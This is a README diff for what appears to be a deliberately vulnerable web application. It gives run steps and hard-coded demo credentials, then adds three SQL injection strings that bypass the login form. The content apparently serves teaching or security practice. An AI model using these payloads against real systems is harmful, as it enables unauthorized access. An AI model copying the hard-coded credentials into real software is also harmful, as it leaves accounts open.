@@ -4,3 +4,14 @@ How to use
 2. Running porject -> npm run dev
 3. Login Admin -> admin | Admin123
 4. Login Student -> valin | Password12345!
+
+vulnerable login : 
+1. admin' OR '1'='1
+Input Password: (anything)
+2. admin' UNION SELECT 1, 'admin', 'password' --
+Input Password: (anything)
+3. admin' --
+Input Password: (anything)
+
+
+
